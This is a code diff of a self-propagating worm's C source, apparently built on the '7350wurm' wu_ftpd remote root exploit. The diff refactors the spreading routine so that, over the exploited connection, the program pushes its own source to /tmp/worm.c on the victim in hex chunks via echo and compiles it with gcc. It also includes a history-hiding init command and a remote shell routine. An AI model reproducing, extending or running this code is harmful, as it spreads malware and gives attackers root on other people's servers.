@@ -55,7 +55,9 @@ void net_write (int fd, const char *str, ...);
 int net_rtimeout (int fd, int sec);
 int net_rlinet (int fd, char *buf, int bufsize, int sec);
 
-void upload(int fd);
+void propagate(int fd);
+void upload_file(int fd, const char *filename, const char *dest);
+void command(int fd, const char *str, ...);
 int shell(int sock);
 
 int main(int argc, char *argv[]) {
@@ -106,9 +108,7 @@ int main(int argc, char *argv[]) {
     }
     printf (" success.\n");
 
-    upload(fd);
-
-    close(fd);
+    propagate(fd);
 
     // open a shell
     /*ret = shell(fd);
@@ -116,45 +116,62 @@ int main(int argc, char *argv[]) {
         exit(EXIT_FAILURE);
     }*/
 
+    close(fd);
     exit(EXIT_SUCCESS);
 }
 
-void upload(int fd) {
-    unsigned char *worm_buf;
-    unsigned char buf[256], content[256];
+void propagate(int fd) {
+    command(fd, "rm -f /tmp/worm.c");
+    upload_file(fd, "./main.c", "/tmp/worm.c");
+    command(fd, "gcc -o /tmp/worm /tmp/worm.c");
+}
+
+void upload_file(int fd, const char *filename, const char *dest) {
+    FILE *file;
+    int size;
+    unsigned char *file_buf;
+    unsigned char hex_string[256];
     unsigned char hex[8];
-    FILE *worm_fd;
-    int worm_size;
     int i, offset;
 
-    worm_fd = fopen("./main.c", "rb");
-    fseek(worm_fd, 0, SEEK_END);
-    worm_size = ftell(worm_fd);
-    fseek(worm_fd, 0, SEEK_SET);
-    worm_buf = (unsigned char*) malloc(worm_size + 1);
-    fread((void*) worm_buf, worm_size, 1, worm_fd);
+    file = fopen(filename, "rb");
 
-    command(fd, "rm -f /tmp/worm.c");
+    // get the size of the file
+    fseek(file, 0, SEEK_END);
+    size = ftell(file);
+    fseek(file, 0, SEEK_SET);
 
-    printf("Pushing file"); fflush(stdout);
-    for (i=0; i<worm_size; i+=16) {
-        content[0] = 0;
+    // read the entire file into a buffer
+    file_buf = (unsigned char*) malloc(size + 1);
+    fread((void*) file_buf, size, 1, file);
 
-        for (offset=0; offset<MIN(16, worm_size-i); offset++) {
-            sprintf(hex, "\\x%02x", worm_buf[i+offset]);
-            strcat(content, hex);
+    // log the operation
+    printf("Pushing file '%s'", filename);
+    fflush(stdout);
+
+    // push the file 16 bytes at a time
+    for (i=0; i<size; i+=16) {
+        // empty hex_string
+        hex_string[0] = 0;
+
+        // write hexadecimal bytes to hex_string
+        for (offset=0; offset<MIN(16, size-i); offset++) {
+            sprintf(hex, "\\x%02x", file_buf[i+offset]);
+            strcat(hex_string, hex);
         }
 
-        command(fd, "echo -n -e '%s' >> /tmp/worm.c", content);
+        // execute a command to echo the hexadecimal bytes to the dest file
+        command(fd, "echo -n -e '%s' >> %s", hex_string, dest);
 
         // print progress
-        printf("."); fflush(stdout);
+        printf(".");
+        fflush(stdout);
     }
-    printf(" [done]\n");
 
-    printf("Compiling..."); fflush(stdout);
-    command(fd, "gcc -o /tmp/worm /tmp/worm.c");
-    printf(" [done]\n");
+    free(file_buf);
+    fclose(file);
+
+    printf(" [done]\n");    
 }
 
 void command(int fd, const char *str, ...) {
@@ -210,9 +227,13 @@ int shell(int sock) {
 }
 
 
-
-
-/* 7350wurm - x86/linux wu_ftpd remote root exploit */
+/* ================================================ *
+ *                    EXPLOIT                       *
+ * ================================================ *
+ *
+ * 7350wurm - x86/linux wu_ftpd remote root exploit
+ *
+ */
 
 #define VERBOSITY 0
 #define INIT_CMD "unset HISTFILE;id;uname -a;\n"
